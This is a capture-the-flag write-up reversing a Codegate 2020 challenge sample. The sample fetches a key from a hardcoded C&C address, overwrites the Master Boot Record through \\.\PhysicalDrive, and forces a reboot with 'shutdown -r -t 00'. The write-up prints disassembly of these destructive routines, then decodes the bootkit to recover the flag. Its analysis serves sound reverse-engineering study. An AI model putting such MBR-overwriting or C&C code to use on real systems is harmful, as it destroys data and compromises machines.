## Codegate CTF 2020 Preliminary - Malicious (RE 702)
##### 08-09/02/2020 (24hr)
___

### Description: 

```
I bring very malicious virus sample from future! Can you rev this virus?
flag format is CODEGATE2020{[printed string by given program]}

[Warning]
Program may harmful to your system!
Use static analysis only or carefully handled dynamic analysis with virtual machine.

Download:
http://ctf.codegate.org/099ef54feeff0c4e7c2e4c7dfd7deb6e/c8ed6be8cf99e9e3471458296ad4d8fa

ZIP FILE PASSWORD : 1717117
```
___

### Solution

The actual malware starts at `main_401180`. After some initialization, `initialize_keyA_4040DE`
is called:
```assembly
.text:004040DE initialize_keyA_4040DE proc near                         ; CODE XREF: main_401180+25Dp
.text:004040DE                 push    ebp
.text:004040DF                 mov     ebp, esp
.text:004040E1                 and     esp, 0FFFFFFF0h
.text:004040E4                 call    sub_404A60
.text:004040E9                 nop
.text:004040EA
.text:004040EA LOOP_4040EA:                                             ; CODE XREF: initialize_keyA_4040DE+1Cj
.text:004040EA                 call    gen_5_rand_bytes_403ED2          ; generate the same 5 "random" bytes:
.text:004040EF                 test    eax, eax                         ; FF D3 30 B7 07
.text:004040F1                 jz      short SKIP_CnC_4040FC
.text:004040F3                 call    fetch_future_key_from_CnC_403F8C ; this will be executed in future! (when MSBit of timestamp is 1)
.text:004040F8                 test    eax, eax
.text:004040FA                 jnz     short LOOP_4040EA                ; generate the same 5 "random" bytes:
.text:004040FC
.text:004040FC SKIP_CnC_4040FC:                                         ; CODE XREF: initialize_keyA_4040DE+13j
.text:004040FC                 call    sub_403DB1
.text:00404101                 mov     eax, 0
.text:00404106                 leave
.text:00404107                 retn
.text:00404107 initialize_keyA_4040DE endp
```

First, `gen_5_rand_bytes_403ED2` is called:
```assembly
.text:00403ED2 gen_5_rand_bytes_403ED2 proc near                        ; CODE XREF: initialize_keyA_4040DE:LOOP_4040EAp
.text:00403ED2
.text:00403ED2 Time    = dword ptr -38h
.text:00403ED2 Val     = dword ptr -34h
.text:00403ED2 Size    = dword ptr -30h
.text:00403ED2 seed_1_1A= word ptr -1Ah
.text:00403ED2 var_18  = word ptr -18h
.text:00403ED2 var_16  = word ptr -16h
.text:00403ED2 var_14  = word ptr -14h
.text:00403ED2 var_12  = word ptr -12h
.text:00403ED2 timestamp_10= dword ptr -10h
.text:00403ED2 iter_9  = byte ptr -9
.text:00403ED2
.text:00403ED2         push    ebp
.text:00403ED3         mov     ebp, esp
.text:00403ED5         push    esi
.text:00403ED6         push    ebx
.text:00403ED7         sub     esp, 30h
.text:00403EDA         mov     [ebp+seed_1_1A], 17Ch                    ; seeds for srand()
.text:00403EE0         mov     [ebp+var_18], 35h
.text:00403EE6         mov     [ebp+var_16], 3
.text:00403EEC         mov     [ebp+var_14], 0C9h
.text:00403EF2         mov     [ebp+var_12], 45h
.text:00403EF8         lea     eax, [ebp+timestamp_10]
.text:00403EFB         mov     [esp+38h+Time], eax                      ; Time
.text:00403EFE         call    time                                     ; get current timestamp
.text:00403F03         mov     [esp+38h+Size], 10h                      ; Size
.text:00403F0B         mov     [esp+38h+Val], 0                         ; Val
.text:00403F13         mov     [esp+38h+Time], offset init_key_A_40D5B0 ; Dst
.text:00403F1A         call    memset
.text:00403F1F         mov     [ebp+iter_9], 0                          ; i = 0
.text:00403F23         jmp     short loc_403F50
.text:00403F25 ; ---------------------------------------------------------------------------
.text:00403F25
.text:00403F25 LOOP_403F25:                                             ; CODE XREF: gen_5_rand_bytes_403ED2+82j
.text:00403F25         movsx   eax, [ebp+iter_9]
.text:00403F29         movzx   eax, [ebp+eax*2+seed_1_1A]               ; eax = seed[i]
.text:00403F2E         cwde
.text:00403F2F         mov     [esp+38h+Time], eax                      ; Seed
.text:00403F32         call    srand
.text:00403F37         movsx   ebx, [ebp+iter_9]
.text:00403F3B         call    rand
.text:00403F40         mov     ds:init_key_A_40D5B0[ebx], al
.text:00403F46         movzx   eax, [ebp+iter_9]
.text:00403F4A         add     eax, 1
.text:00403F4D         mov     [ebp+iter_9], al
.text:00403F50
.text:00403F50 loc_403F50:                                              ; CODE XREF: gen_5_rand_bytes_403ED2+51j
.text:00403F50         cmp     [ebp+iter_9], 4
.text:00403F54         jle     short LOOP_403F25                        ; this loop generates always the same 5 bytes
.text:00403F56         mov     eax, [ebp+timestamp_10]
.text:00403F59         mov     ecx, eax
.text:00403F5B         mov     ebx, eax
.text:00403F5D         sar     ebx, 1Fh                                 ; if MSBit of timestamp is set, ebx becomes -1
.text:00403F60         mov     eax, offset init_key_A_40D5B0            ; otherwise ebx = 0
.text:00403F65         mov     edx, [eax+4]
.text:00403F68         mov     eax, [eax]
.text:00403F6A         mov     esi, 1
.text:00403F6F         cmp     ebx, edx                                 ; MSB of timestamp VS rand
.text:00403F71         ja      short loc_403F80                         ; if above return 1
.text:00403F73         cmp     ebx, edx
.text:00403F75         jb      short loc_403F7B                         ; if below return 1
.text:00403F77         cmp     ecx, eax
.text:00403F79         jnb     short loc_403F80                         ; if equal check low DWORDs
.text:00403F7B
.text:00403F7B loc_403F7B:                                              ; CODE XREF: gen_5_rand_bytes_403ED2+A3j
.text:00403F7B         mov     esi, 0
.text:00403F80
.text:00403F80 loc_403F80:                                              ; CODE XREF: gen_5_rand_bytes_403ED2+9Fj
.text:00403F80                                                          ; gen_5_rand_bytes_403ED2+A7j
.text:00403F80         mov     eax, esi
.text:00403F82         movzx   eax, al
.text:00403F85         add     esp, 30h
.text:00403F88         pop     ebx
.text:00403F89         pop     esi
.text:00403F8A         pop     ebp
.text:00403F8B         retn
.text:00403F8B gen_5_rand_bytes_403ED2 endp
```

This function uses `rand`/`srand` to generate 5 random bytes. However the initial seed is the
same, so this function always returns the same 5 random bytes: `FF D3 30 B7 07`. However, the
most interesting part of the function, is the return value: _If the MSB of the current timestampt
is 1, then function returns 1, otherwise it returns 0_. If `gen_5_rand_bytes_403ED2` returns 1
(which means that we're in the "future"), then `fetch_future_key_from_CnC_403F8C` is called:
```assembly
.text:00403F8C fetch_future_key_from_CnC_403F8C proc near               ; CODE XREF: initialize_keyA_4040DE+15p
.text:00403F8C         push    ebp
.text:00403F8D         mov     ebp, esp
.text:00403F8F         sub     esp, 1C8h
.text:00403F95         lea     eax, [ebp+WSAData]
.text:00403F9B         mov     [esp+1C8h+lpWSAData], eax                ; lpWSAData
.text:00403F9F         mov     dword ptr [esp+1C8h+wVersionRequested], 202h ; wVersionRequested
.text:00403FA6         mov     eax, ds:WSAStartup
.text:00403FAB         call    eax ; WSAStartup
.text:00403FAD         sub     esp, 8
.text:00403FB0         mov     [esp+1C8h+protocol], 0                   ; protocol
.text:00403FB8         mov     [esp+1C8h+lpWSAData], 1                  ; type
.text:00403FC0         mov     dword ptr [esp+1C8h+wVersionRequested], 2 ; af
.text:00403FC7         mov     eax, ds:socket
.text:00403FCC         call    eax ; socket
.text:00403FCE         sub     esp, 0Ch
.text:00403FD1         mov     [ebp+s], eax
.text:00403FD4         mov     [esp+1C8h+protocol], 10h                 ; Size
.text:00403FDC         mov     [esp+1C8h+lpWSAData], 0                  ; Val
.text:00403FE4         lea     eax, [ebp+Dst]
.text:00403FEA         mov     dword ptr [esp+1C8h+wVersionRequested], eax ; Dst
.text:00403FED         call    memset
.text:00403FF2         mov     [ebp+Dst], 2
.text:00403FFB         mov     dword ptr [esp+1C8h+wVersionRequested], offset cp ; "195.157.15.100"
.text:00404002         mov     eax, ds:inet_addr
.text:00404007         call    eax ; inet_addr
.text:00404009         sub     esp, 4
.text:0040400C         mov     [ebp+var_1AC], eax
.text:00404012         mov     dword ptr [esp+1C8h+wVersionRequested], 332Ch ; hostshort
.text:00404019         mov     eax, ds:htons
.text:0040401E         call    eax ; htons
.text:00404020         sub     esp, 4
.text:00404023         mov     [ebp+var_1AE], ax
.text:0040402A         mov     [esp+1C8h+protocol], 10h                 ; namelen
.text:00404032         lea     eax, [ebp+Dst]
.text:00404038         mov     [esp+1C8h+lpWSAData], eax                ; name
.text:0040403C         mov     eax, [ebp+s]
.text:0040403F         mov     dword ptr [esp+1C8h+wVersionRequested], eax ; s
.text:00404042         mov     eax, ds:connect
.text:00404047         call    eax ; connect
.text:00404049         sub     esp, 0Ch
.text:0040404C         test    eax, eax
.text:0040404E         jz      short CONNET_OK_40405A
.text:00404050         mov     eax, 0
.text:00404055         jmp     locret_4040DC
.text:0040405A ; ---------------------------------------------------------------------------
.text:0040405A
.text:0040405A CONNET_OK_40405A:                                        ; CODE XREF: fetch_future_key_from_CnC_403F8C+C2j
.text:0040405A         mov     [esp+1C8h+flags], 0                      ; flags
.text:00404062         mov     [esp+1C8h+protocol], 16h                 ; len
.text:0040406A         mov     [esp+1C8h+lpWSAData], offset buf         ; "GET /status HTTP/1.1\r\n"
.text:00404072         mov     eax, [ebp+s]
.text:00404075         mov     dword ptr [esp+1C8h+wVersionRequested], eax ; s
.text:00404078         mov     eax, ds:send
.text:0040407D         call    eax ; send
.text:0040407F         sub     esp, 10h
.text:00404082         mov     [esp+1C8h+flags], 0                      ; flags
.text:0040408A         mov     [esp+1C8h+protocol], 8                   ; len
.text:00404092         mov     [esp+1C8h+lpWSAData], offset network_key_40D5B8 ; buf
.text:0040409A         mov     eax, [ebp+s]
.text:0040409D         mov     dword ptr [esp+1C8h+wVersionRequested], eax ; s
.text:004040A0         mov     eax, ds:recv                             ; read 8 bytes from the server
.text:004040A5         call    eax ; recv
.text:004040A7         sub     esp, 10h
.text:004040AA         mov     [esp+1C8h+lpWSAData], 8                  ; size_t
.text:004040B2         mov     dword ptr [esp+1C8h+wVersionRequested], offset network_key_40D5B8 ; void *
.text:004040B9         call    decrypt_network_key_4039BE
.text:004040BE         mov     [ebp+Buf1], eax
.text:004040C1         mov     [esp+1C8h+protocol], 10h                 ; Size
.text:004040C9         mov     [esp+1C8h+lpWSAData], offset target_network_key_40C07F ; Buf2
.text:004040D1         mov     eax, [ebp+Buf1]
.text:004040D4         mov     dword ptr [esp+1C8h+wVersionRequested], eax ; Buf1
.text:004040D7         call    memcmp
.text:004040DC
.text:004040DC locret_4040DC:                                           ; CODE XREF: fetch_future_key_from_CnC_403F8C+C9j
.text:004040DC         leave
.text:004040DD         retn
.text:004040DD fetch_future_key_from_CnC_403F8C endp
```

This function connects to `195.157.15.100:13100` and retrieves an 8 byte key. Of course we're in
the "future" so this address doesn't exist. Once program receives the new key, it invokes
`encrypt_network_key_4039BE` to encrypt it and then it uses `memcmp` to verify it against:
```
D4 EE 0F BB EB 7F FD 4F  D7 A7 D4 77 A7 EC D9 22
```

It's easy to infer that `encrypt_network_key_4039BE` is nothing more than an MD5 implementation.
If we look at `consts_40D080`, we can see that all constants `D76AA478`, `E8C7B756` and so on,
are the magic constants used by MD5:
```assembly
.bss:0040D080 consts_40D080 dd 0D76AA478h   ; DATA XREF: encrypt_network_key_4039BE+1Co
.bss:0040D084         dd 0E8C7B756h
.bss:0040D088         dd 242070DBh
.bss:0040D08C         dd 0C1BDCEEEh
.bss:0040D090         dd 0F57C0FAFh
```

Since we cannot connect to the server and get the key, we have to break the md5 hash. We use
[Hash Killer](https://hashes.com/decrypt/basic) to find the key within seconds:
```
    d4ee0fbbeb7ffd4fd7a7d477a7ecd922:activate
```

So the secret key that is being fetched from the C&C is "activate". If the key is correct,
`sub_403DB1` is called to decrypt the payload:
```assembly
.text:00403DB1         push    ebp
.text:00403DB2         mov     ebp, esp
.text:00403DB4         sub     esp, 138h
.text:00403DBA         lea     eax, [ebp+var_128]
.text:00403DC0         mov     [esp+138h+var_130], eax                  ; output buffer
.text:00403DC4         mov     [esp+138h+var_134], 80h                  ; mode ?
.text:00403DCC         mov     [esp+138h+var_138], offset init_key_A_40D5B0 ; key
.text:00403DD3         call    decrypt_payload_403786
.text:00403DD8         lea     eax, [ebp+var_128]
.text:00403DDE         mov     [esp+138h+var_130], eax                  ; same buffer
.text:00403DE2         mov     [esp+138h+var_134], offset key_B_40A440
.text:00403DEA         mov     [esp+138h+var_138], offset key_B_40A440
.text:00403DF1         call    update_key_40381A
.text:00403DF6         lea     eax, [ebp+var_128]
.text:00403DFC         mov     [esp+138h+var_130], eax
.text:00403E00         mov     [esp+138h+var_134], 80h
.text:00403E08         mov     [esp+138h+var_138], offset key_B_40A440
.text:00403E0F         call    decrypt_payload_403786
.text:00403E14         lea     eax, [ebp+var_128]
.text:00403E1A         mov     [esp+138h+var_130], eax
.text:00403E1E         mov     [esp+138h+var_134], offset key_C_40A450
.text:00403E26         mov     [esp+138h+var_138], offset key_C_40A450
.text:00403E2D         call    update_key_40381A
.text:00403E32         lea     eax, [ebp+var_128]
.text:00403E38         mov     [esp+138h+var_130], eax
.text:00403E3C         mov     [esp+138h+var_134], 80h
.text:00403E44         mov     [esp+138h+var_138], offset key_C_40A450
.text:00403E4B         call    decrypt_payload_403786
.text:00403E50         lea     eax, [ebp+var_128]
.text:00403E56         mov     [esp+138h+var_130], eax
.text:00403E5A         mov     [esp+138h+var_134], offset key_B_40A440
.text:00403E62         mov     [esp+138h+var_138], offset key_B_40A440
.text:00403E69         call    update_key_40381A
.text:00403E6E         lea     eax, [ebp+var_128]
.text:00403E74         mov     [esp+138h+var_130], eax
.text:00403E78         mov     [esp+138h+var_134], 80h
.text:00403E80         mov     [esp+138h+var_138], offset key_C_40A450
.text:00403E87         call    decrypt_payload_403786
.text:00403E8C         mov     [ebp+var_C], 0
.text:00403E93         jmp     short loc_403EC1
.text:00403E95 ; ---------------------------------------------------------------------------
.text:00403E95
.text:00403E95 loc_403E95:                                              ; CODE XREF: sub_403DB1+117j
.text:00403E95         mov     eax, [ebp+var_C]
.text:00403E98         lea     ecx, DECRYPTED_PAYLOAD_403CC1[eax]
.text:00403E9E         mov     eax, [ebp+var_C]
.text:00403EA1         lea     edx, DECRYPTED_PAYLOAD_403CC1[eax]
.text:00403EA7         lea     eax, [ebp+var_128]
.text:00403EAD         mov     [esp+138h+var_130], eax
.text:00403EB1         mov     [esp+138h+var_134], ecx
.text:00403EB5         mov     [esp+138h+var_138], edx
.text:00403EB8         call    update_key_40381A
.text:00403EBD         add     [ebp+var_C], 10h
.text:00403EC1
.text:00403EC1 loc_403EC1:                                              ; CODE XREF: sub_403DB1+E2j
.text:00403EC1         cmp     [ebp+var_C], 0EFh
.text:00403EC8         jle     short loc_403E95
.text:00403ECA         call    DECRYPTED_PAYLOAD_403CC1
.text:00403ECF         nop
.text:00403ED0         leave
.text:00403ED1         retn
```

We don't really care what `decrypt_payload_403786` and `update_key_40381A` functions do
(we have the right key, so decryption will be successful). All we care about
is `DECRYPTED_PAYLOAD_403CC1`:
```assembly
.text:00403CC1 DECRYPTED_PAYLOAD_403CC1:                                ; CODE XREF: sub_403DB1+119p
.text:00403CC1                                                          ; DATA XREF: sub_403DB1+E7o ...
.text:00403CC1         push    ebp
.text:00403CC2         mov     ebp, esp
.text:00403CC4         sub     esp, 158h
.text:00403CCA         lea     eax, [ebp-130h]
.text:00403CD0         mov     [esp+8], eax
.text:00403CD4         mov     dword ptr [esp+4], 80h
.text:00403CDC         mov     dword ptr [esp], offset key_B_40A440
.text:00403CE3         call    decrypt_payload_403786
.text:00403CE8         mov     dword ptr [ebp-0Ch], 0
.text:00403CEF         jmp     short loc_403D1D
.text:00403CF1 ; ---------------------------------------------------------------------------
.text:00403CF1
.text:00403CF1 LOOP_2_403CF1:                                           ; CODE XREF: .text:00403D24j
.text:00403CF1         mov     eax, [ebp-0Ch]
.text:00403CF4         lea     ecx, unk_406040[eax]
.text:00403CFA         mov     eax, [ebp-0Ch]
.text:00403CFD         lea     edx, unk_406040[eax]
.text:00403D03         lea     eax, [ebp-130h]
.text:00403D09         mov     [esp+8], eax
.text:00403D0D         mov     [esp+4], ecx
.text:00403D11         mov     [esp], edx
.text:00403D14         call    update_key_40381A
.text:00403D19         add     dword ptr [ebp-0Ch], 10h
.text:00403D1D
.text:00403D1D loc_403D1D:                                              ; CODE XREF: .text:00403CEFj
.text:00403D1D         cmp     dword ptr [ebp-0Ch], 43FFh
.text:00403D24         jle     short LOOP_2_403CF1
.text:00403D26         mov     dword ptr [esp+18h], 0
.text:00403D2E         mov     dword ptr [esp+14h], 0
.text:00403D36         mov     dword ptr [esp+10h], 3
.text:00403D3E         mov     dword ptr [esp+0Ch], 0
.text:00403D46         mov     dword ptr [esp+8], 3
.text:00403D4E         mov     dword ptr [esp+4], 10000000h
.text:00403D56         mov     dword ptr [esp], offset a_Physicaldrive10000 ; "\\\\.\\PhysicalDrive10000"
.text:00403D5D         mov     eax, ds:CreateFileA
.text:00403D62         call    eax ; CreateFileA
.text:00403D64         sub     esp, 1Ch
.text:00403D67         mov     [ebp-10h], eax
.text:00403D6A         cmp     dword ptr [ebp-10h], 0FFFFFFFFh
.text:00403D6E         jnz     short loc_403D72
.text:00403D70         jmp     short locret_403DAF
.text:00403D72 ; ---------------------------------------------------------------------------
.text:00403D72
.text:00403D72 loc_403D72:                                              ; CODE XREF: .text:00403D6Ej
.text:00403D72         mov     dword ptr [esp+10h], 0
.text:00403D7A         lea     eax, [ebp-14h]
.text:00403D7D         mov     [esp+0Ch], eax
.text:00403D81         mov     dword ptr [esp+8], 4400h
.text:00403D89         mov     dword ptr [esp+4], offset unk_406040
.text:00403D91         mov     eax, [ebp-10h]
.text:00403D94         mov     [esp], eax
.text:00403D97         mov     eax, ds:WriteFile
.text:00403D9C         call    eax ; WriteFile
.text:00403D9E         sub     esp, 14h
.text:00403DA1         mov     dword ptr [esp], offset aShutdownRT00    ; "shutdown -r -t 00"
.text:00403DA8         call    system
.text:00403DAD         nop
.text:00403DAE         nop
.text:00403DAF
.text:00403DAF locret_403DAF:                                           ; CODE XREF: .text:00403D70j
.text:00403DAF         leave
.text:00403DB0         retn
```

Not much to say, function creates a file at `\\.\PhysicalDrive10000` (the first physical
sector on the drive, i.e., **Master Boot Record**), writes some data to it and reboots system.
That is, we have a bootkit that infects MBR. We get this file
(let's name it [master_boot_record](./master_boot_record)) and we move on with the second stage
of the malware.


### Reversing the Master Boot Record (MBR)

The 2nd stage of the malware is a malicious Master Boot Record (MBR). We load it on address
`0x7c00` (yes, that's important):
```assembly
seg000:7C00
seg000:7C00             ; Segment type: Pure code
seg000:7C00             seg000          segment byte public 'CODE' use16
seg000:7C00                     assume cs:seg000
seg000:7C00                     ;org 7C00h
seg000:7C00                     assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing
seg000:7C00 FA                   cli
seg000:7C01 33 C0                xor     ax, ax
seg000:7C03 8E D0                mov     ss, ax
seg000:7C05 BC 00 7C             mov     sp, 7C00h
seg000:7C08 8B F4                mov     si, sp
seg000:7C0A 50                   push    ax
seg000:7C0B 07                   pop     es
seg000:7C0C 50                   push    ax
seg000:7C0D 1F                   pop     ds
seg000:7C0E F0 FC                lock cld
seg000:7C10 BF 00 06             mov     di, 600h
seg000:7C13 B9 00 01             mov     cx, 100h
seg000:7C16 F2 A5                repne movsw
seg000:7C18 BF 00 06             mov     di, 600h
seg000:7C1B
seg000:7C1B             DECR_LOOP_7C1B:                  ; CODE XREF: seg000:7C24j
seg000:7C1B 80 35 F4             xor     byte ptr [di], 0F4h
seg000:7C1E 66 47                inc     edi
seg000:7C20 81 FF E0 06          cmp     di, 6E0h
seg000:7C24 7C F5                jl      short DECR_LOOP_7C1B
seg000:7C26 EA 30 06 00+         jmp     far ptr 0:630h
```

After the prolog, there's a classic payload decryption routine that XORs each byte of the code
with `0xF4`. More specifically, program loads itself at address `0x600` and decrypts it on memory.
After decryption it jumps at address `0x630`. Since we don't debug the MBR (we can do it using
bochs debugger), we write a small IDA script to decrypt the code for us:
```python
import idaapi
from idaapi import Choose2

start_ea = 0x7C2b

for ix in xrange(0xe0):
    print ix
    byte_to_decr = idaapi.get_byte(start_ea + ix)   
    byte_decr = byte_to_decr ^ 0xf4

    idaapi.patch_byte(start_ea + ix, byte_decr)
```

After running the script, we get a nice disassembly listing. First of all, code checks century:
```assembly
seg000:7C30 BE C0 06             mov     si, 6C0h
seg000:7C33 B4 04                mov     ah, 4
seg000:7C35 CD 1A                int     1Ah     ; CLOCK - READ DATE FROM REAL TIME CLOCK (AT,XT286,CONV,PS)
seg000:7C35                                      ; Return: DL = day in BCD
seg000:7C35                                      ; DH = month in BCD
seg000:7C35                                      ; CL = year in BCD
seg000:7C35                                      ; CH = century (19h or 20h)
seg000:7C37 80 FD 30             cmp     ch, 30h
seg000:7C3A 0F 8D 12 00          jge     CENTURY_OK_7C50
```

So if we are not in **30th** century program program prints `Not a chance.` which is 
stored after the code (register `si` is set to `6C0h`:
```assembly
seg000:7C43
seg000:7C43             PRINT_BADBOY_7C43:                      ; CODE XREF: seg000:7C4Cj
seg000:7C43 AC                   lodsb
seg000:7C44 3C 00                cmp     al, 0
seg000:7C46 74 06                jz      short loc_7C4E
seg000:7C48 B4 0E                mov     ah, 0Eh
seg000:7C4A CD 10                int     10h     ; - VIDEO - WRITE CHARACTER AND ADVANCE CURSOR (TTY WRITE)
seg000:7C4A                                      ; AL = character, BH = display page (alpha modes)
seg000:7C4A                                      ; BL = foreground color (graphics modes)
seg000:7C4C EB F5                jmp     short PRINT_BADBOY_7C43

....

seg000:7CB5             ; ---------------------------------------------------------------------------
seg000:7CB7 AD                   db 0ADh ; ¡
seg000:7CB8 56                   db  56h ; V
seg000:7CB9 48                   db  48h ; H
seg000:7CBA E7                   db 0E7h ; t
seg000:7CBB 37                   db  37h ; 7
seg000:7CBC F6                   db 0F6h ; ÷
seg000:7CBD 27                   db  27h ; '
seg000:7CBE E4                   db 0E4h ; S
seg000:7CBF 00                   db    0
seg000:7CC0 4E 6F 74 20+aNotAChance_    db 'Not a chance.',0
seg000:7CCE 66                   db  66h ; f
seg000:7CCF 72                   db  72h ; r
```

This makes sense according to the challenge description ("virus sample from future"). So if century,
is right, program computes the flag:
```assembly
seg000:7C50             CENTURY_OK_7C50:                 ; CODE XREF: seg000:7C3Aj
seg000:7C50 BF AD DE             mov     di, 0DEADh
seg000:7C53
seg000:7C53             LOOP_1_7C53:                    ; CODE XREF: seg000:7C88j
seg000:7C53 BE EF BE             mov     si, 0BEEFh
seg000:7C56
seg000:7C56             LOOP_2_7C56:                    ; CODE XREF: seg000:7C80j
seg000:7C56 BA 80 00             mov     dx, 80h
seg000:7C59 B8 20 02             mov     ax, 220h
seg000:7C5C BB 00 10             mov     bx, 1000h
seg000:7C5F B9 03 00             mov     cx, 3
seg000:7C62 CD 13                int     13h            ; DISK - READ SECTORS INTO MEMORY
seg000:7C62                                             ; AL = number of sectors to read, CH = track, CL = sector
seg000:7C62                                             ; DH = head, DL = drive, ES:BX -> buffer to fill
seg000:7C62                                             ; Return: CF set on error, AH = status, AL = number of sectors read
seg000:7C64 B8 01 02             mov     ax, 201h
seg000:7C67 BB 00 50             mov     bx, 5000h
seg000:7C6A B9 02 00             mov     cx, 2
seg000:7C6D CD 13                int     13h            ; DISK - READ SECTORS INTO MEMORY
seg000:7C6D                                             ; AL = number of sectors to read, CH = track, CL = sector
seg000:7C6D                                             ; DH = head, DL = drive, ES:BX -> buffer to fill
seg000:7C6D                                             ; Return: CF set on error, AH = status, AL = number of sectors read
seg000:7C6F B8 21 03             mov     ax, 321h
seg000:7C72 BB 00 10             mov     bx, 1000h
seg000:7C75 B9 02 00             mov     cx, 2
seg000:7C78 CD 13                int     13h            ; DISK - WRITE SECTORS FROM MEMORY
seg000:7C78                                             ; AL = number of sectors to write, CH = track, CL = sector
seg000:7C78                                             ; DH = head, DL = drive, ES:BX -> buffer
seg000:7C78                                             ; Return: CF set on error, AH = status, AL = number of sectors written
seg000:7C7A 83 EE 01             sub     si, 1
seg000:7C7D 83 FE 00             cmp     si, 0
seg000:7C80 75 D4                jnz     short LOOP_2_7C56
seg000:7C82 83 EF 01             sub     di, 1
seg000:7C85 83 FF 00             cmp     di, 0
seg000:7C88 75 C9                jnz     short LOOP_1_7C53
```

After the MSB, there are 32 more sectors (**512 bytes** each) containing random ASCII characters:
```assembly
seg000:7E00 4A                   db  4Ah ; J
seg000:7E01 57                   db  57h ; W
seg000:7E02 5E                   db  5Eh ; ^
seg000:7E03 75                   db  75h ; u
seg000:7E04 38                   db  38h ; 8
seg000:7E05 66                   db  66h ; f
seg000:7E06 3B                   db  3Bh ; ;
seg000:7E07 79                   db  79h ; y
seg000:7E08 3A                   db  3Ah ; :
seg000:7E09 60                   db  60h ; `
seg000:7E0A 75                   db  75h ; u
seg000:7E0B 61                   db  61h ; a
seg000:7E0C 26                   db  26h ; &
....
```

Code starts  by shuffling the sectors: It reads the **2nd** sector (the first sector is the MBR)
and puts it after the **32nd** sector. This process repeats `0xdead*0xbeef` times. After shuffling
is done, code selects some characters and prints them to the console:
```assembly
seg000:7C8A B9 02 00            mov     cx, 2
seg000:7C8D BB 00 10            mov     bx, 1000h
seg000:7C90
seg000:7C90             LOOP_3_7C90:                    ; CODE XREF: seg000:7CB3j
seg000:7C90 B8 01 02            mov     ax, 201h
seg000:7C93 CD 13               int     13h      ; DISK - READ SECTORS INTO MEMORY
seg000:7C93                                      ; AL = number of sectors to read, CH = track, CL = sector
seg000:7C93                                      ; DH = head, DL = drive, ES:BX -> buffer to fill
seg000:7C93                                      ; Return: CF set on error, AH = status, AL = number of sectors read
seg000:7C95 88 C8                mov     al, cl
seg000:7C97 B4 00                mov     ah, 0
seg000:7C99 83 E8 02             sub     ax, 2
seg000:7C9C 6B C0 0D             imul    ax, 0Dh
seg000:7C9F 83 C0 01             add     ax, 1
seg000:7CA2 80 E4 01             and     ah, 1
seg000:7CA5 89 DE                mov     si, bx
seg000:7CA7 01 C6                add     si, ax
seg000:7CA9 AC                   lodsb
seg000:7CAA B4 0E                mov     ah, 0Eh
seg000:7CAC CD 10                int     10h     ; - VIDEO - WRITE CHARACTER AND ADVANCE CURSOR (TTY WRITE)
seg000:7CAC                                      ; AL = character, BH = display page (alpha modes)
seg000:7CAC                                      ; BL = foreground color (graphics modes)
seg000:7CAE FE C1                inc     cl
seg000:7CB0 80 F9 23             cmp     cl, 23h
seg000:7CB3 7C DB                jl      short LOOP_3_7C90
seg000:7CB5
seg000:7CB5             loc_7CB5:                ; CODE XREF: seg000:loc_7CB5j
seg000:7CB5 EB FE                jmp     short loc_7CB5

....
```

The decompiled version of the code is shown below:
```python
key = ''

for cx in xrange(2, 0x23):
    idx = ((cx - 2)*0xD + 1) & 0x1FF

    key += chr(disk_data[0x200*(cx-2) + idx])
```


Note that after 33 shuffles, the sectors are in the original position. Therefore we only have
to do `0xdead*0xbeef % 33` shuffles. Then we can apply the above code to reconstruct the
key/flag: `8_bits_per_byte_1_byte_per_sector`.


For more details, please take a look at [malicious_mbr_crack.py](./malicious_mbr_crack.py).

___